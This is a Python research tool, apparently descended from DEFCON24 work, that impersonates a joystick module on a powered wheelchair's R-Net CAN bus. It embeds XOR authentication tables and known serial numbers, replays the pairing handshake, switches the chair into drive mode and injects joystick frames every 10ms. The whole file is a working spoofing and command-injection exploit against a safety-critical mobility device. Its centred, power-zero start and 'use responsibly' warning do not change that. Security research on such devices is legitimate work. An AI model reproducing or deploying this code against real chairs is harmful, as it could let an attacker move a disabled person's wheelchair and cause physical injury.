#!/usr/bin/env python3
"""
EmulateJSM - Spoof a JSM on the R-Net CAN bus without a physical joystick.

Replays the JSM wakeup handshake to impersonate a JSM, then injects
joystick position frames. No physical JSM required — only works with
JSM serial numbers the PM has seen before.

Based on jsm_startup_emu.py from the DEFCON24 research.

Usage:
    python3 emulate_jsm.py                          # Use default serial (08901c8a)
    python3 emulate_jsm.py --serial 50c01c8f        # Use specific serial
    python3 emulate_jsm.py --table m300             # Use M300 XOR table
    python3 emulate_jsm.py --interface can0         # Use specific CAN interface
    python3 emulate_jsm.py --joy-id 02000100        # Use specific joystick frame ID

WARNING: This sends drive commands to a wheelchair. Use responsibly.

Authors: Stephen Chavez & Specter
"""

import argparse
import os
import signal
import socket
import struct
import sys
import threading
import time

# Add lib/ to path for can2RNET import
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'lib'))
from can2RNET import (build_frame, dissect_frame, cansend, canwait,
                       canwaitRTR, canrepeat, canrepeat_stop, opencansocket)


# Known XOR tables for serial number challenge/response
XOR_TABLES = {
    'standalone_jsm': [0x00, 0x21, 0x02, 0xCC, 0xDD, 0x12, 0x7B, 0x45],
    'm300':           [0x83, 0x52, 0xAD, 0x1B, 0xED, 0x06, 0x2C, 0x4E],
}

# Default serial number (standalone JSM from original research)
DEFAULT_SERIAL = '08901c8a'
DEFAULT_TABLE = 'standalone_jsm'


def compute_keys(serial_hex, xor_table):
    """Compute authentication keys from serial and XOR table.

    key[i] = serial[i] XOR xor_table[i]
    """
    serial_bytes = bytes.fromhex(serial_hex.ljust(16, '0'))
    return [s ^ x for s, x in zip(serial_bytes, xor_table)]


def serial_challenge_response(s, serial_hex, xor_table, slot=0):
    """Respond to PM serial number challenge.

    PM sends 8 RTR frames with computed keys in the ID.
    We respond with serial bytes using the same keys.
    Challenge values in RTR are ignored by the device.
    """
    keys = compute_keys(serial_hex, xor_table)
    serial_bytes = bytes.fromhex(serial_hex.ljust(16, '0'))

    # Wait for first RTR challenge
    canwaitRTR(s, '1f000000:1fff0000')

    # Send all 8 responses
    for seq in range(8):
        key = keys[seq]
        val = serial_bytes[seq]
        frame_id = f'1f{seq:01x}1{slot:01x}{key:02x}{val:02x}'
        cansend(s, f'{frame_id}#')


def parameter_exchange(s, slot='1'):
    """Perform POP Quick parameter exchange with PM.

    JSM (slot 1) queries PM (slot 0) for configuration parameters
    via 0x781/0x790 frames.
    """
    params = [
        ('2080000011000000', '4080000000000000'),  # Check page 0x11
        ('2081000006000100', '408F000000000000'),   # Pointer 0x06 sub 0x01
        ('2081000002000000', '408F000000000000'),   # Pointer 0x02
        ('2081000008000100', '408F000000000000'),   # Pointer 0x08 sub 0x01
        ('2081000013000100', '408F000000000000'),   # Pointer 0x13 sub 0x01
        ('208100000E000100', '408F000000000000'),   # Pointer 0x0E sub 0x01
        ('2081000018000100', '408F000000000000'),   # Pointer 0x18 sub 0x01
        ('2080000000000000', None),                 # Close page
        ('4040000000000000', None),                 # Suspend current mode
        ('4050000000000000', None),                 # Suspend profile
    ]

    for req, follow_up in params:
        cansend(s, f'78{slot}#{req}')
        canwait(s, '790:7ff')
        if follow_up:
            cansend(s, f'78{slot}#{follow_up}')
            canwait(s, '790:7ff')


def joystick_thread(s, joy_id, get_position):
    """Send joystick position frames every 10ms.

    get_position() should return (x, y) as signed int8 values.
    """
    interval = 0.01  # 10ms
    frame = bytearray(build_frame(joy_id + '#0000'))
    next_time = time.time() + interval

    while True:
        x, y = get_position()
        frame[8] = x & 0xFF
        frame[9] = y & 0xFF
        try:
            s.send(frame)
        except socket.error:
            break
        next_time += interval
        now = time.time()
        if now < next_time:
            time.sleep(next_time - now)
        else:
            next_time = now + interval


def emulate_jsm(interface='can0', serial_hex=DEFAULT_SERIAL,
                xor_table_name=DEFAULT_TABLE, joy_id='02000100',
                verbose=False):
    """Full JSM emulation: handshake + joystick injection."""

    xor_table = XOR_TABLES[xor_table_name]

    if verbose:
        print(f'Serial:    {serial_hex}')
        print(f'XOR table: {xor_table_name} {[f"0x{x:02x}" for x in xor_table]}')
        print(f'Keys:      {[f"0x{k:02x}" for k in compute_keys(serial_hex, xor_table)]}')
        print(f'Joy ID:    {joy_id}')
        print()

    # Open CAN socket
    s = opencansocket(interface.replace('can', '').replace('vcan', ''))
    if not s:
        print(f'Failed to open {interface}')
        sys.exit(1)

    # Step 1: Test CAN connection (like real JSM does on power-on)
    print('[1/8] Testing CAN connection...')
    cansend(s, '00c#')

    # Step 2: Announce serial number heartbeat
    print('[2/8] Announcing serial number...')
    cansend(s, f'00e#{serial_hex}00000000')

    # Step 3: Wait for PM to request serial confirmation
    print('[3/8] Waiting for PM serial request (7B3)...')
    canwait(s, '7b3:7ff')

    # Step 4: Respond to serial challenge
    print('[4/8] Responding to serial challenge...')
    serial_challenge_response(s, serial_hex, xor_table)

    # Start periodic heartbeats
    thread_00e = canrepeat(s, f'00e#{serial_hex}00000000', 50)

    # Step 5: Wait for config mode drop
    print('[5/8] Waiting for config mode (7B0)...')
    canwait(s, '7b0:7ff')
    cansend(s, '7b0#')

    # Wait for battery level frame
    canwait(s, '1c0c0000:1fffffff')
    cansend(s, '1c240101#')

    # Start device heartbeat
    thread_heartbeat = canrepeat(s, '03c30f0f#87878787878787', 100)

    # Step 6: Parameter exchange
    print('[6/8] Parameter exchange...')
    canwait(s, '040:7ff')
    parameter_exchange(s)

    # Close parameter page and acknowledge
    cansend(s, '041#00000000')
    cansend(s, '041#80000000')

    # Step 7: Wait for mode map
    print('[7/8] Waiting for mode map (050)...')
    canwait(s, '050:7ff')

    # Enter drive mode
    cansend(s, '0c180102#0003')
    cansend(s, '061#00400000')
    canwait(s, '060:7ff')
    cansend(s, '0a040100#00')  # Set power level to 0 (safe start)

    # Step 8: Start joystick
    print('[8/8] JSM handshake complete — sending joystick frames')
    print()
    print('Joystick active. Center position (no movement).')
    print('Press Ctrl+C to stop.')

    # Default: center position (no movement)
    joyx = 0
    joyy = 0

    def get_position():
        return (joyx, joyy)

    jt = threading.Thread(
        target=joystick_thread,
        args=(s, joy_id, get_position),
        daemon=True
    )
    jt.start()

    # Monitor for shutdown frame
    try:
        while True:
            cf, addr = s.recvfrom(16)
            frame = dissect_frame(cf)
            if frame == '000#R':
                print('R-Net shutdown frame received (000#R)')
                break
    except KeyboardInterrupt:
        print('\nStopping...')

    # Cleanup
    canrepeat_stop(thread_heartbeat)
    canrepeat_stop(thread_00e)
    print('EmulateJSM stopped.')


def main():
    parser = argparse.ArgumentParser(
        description='Emulate a JSM on the R-Net CAN bus (no physical joystick required)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Known XOR tables:
  standalone_jsm  [00 21 02 CC DD 12 7B 45]  (default)
  m300            [83 52 AD 1B ED 06 2C 4E]

Known serials:
  08901c8a  Standalone JSM (original research chair)
  50c01c8f  M300 network JSM

WARNING: Only works with JSM serials the PM has previously paired with.
The PM stores known serials and will reject unknown ones.
        """
    )

    parser.add_argument('--serial', '-s', default=DEFAULT_SERIAL,
                        help=f'JSM serial number hex (default: {DEFAULT_SERIAL})')
    parser.add_argument('--table', '-t', default=DEFAULT_TABLE,
                        choices=list(XOR_TABLES.keys()),
                        help=f'XOR table name (default: {DEFAULT_TABLE})')
    parser.add_argument('--interface', '-i', default='can0',
                        help='CAN interface (default: can0)')
    parser.add_argument('--joy-id', '-j', default='02000100',
                        help='Joystick frame ID (default: 02000100)')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Show debug info')

    args = parser.parse_args()

    # Validate serial
    if len(args.serial) != 8:
        print(f'Error: serial must be 8 hex chars, got: {args.serial}')
        sys.exit(1)
    try:
        int(args.serial, 16)
    except ValueError:
        print(f'Error: invalid hex serial: {args.serial}')
        sys.exit(1)

    emulate_jsm(
        interface=args.interface,
        serial_hex=args.serial,
        xor_table_name=args.table,
        joy_id=args.joy_id,
        verbose=args.verbose,
    )


if __name__ == '__main__':
    main()
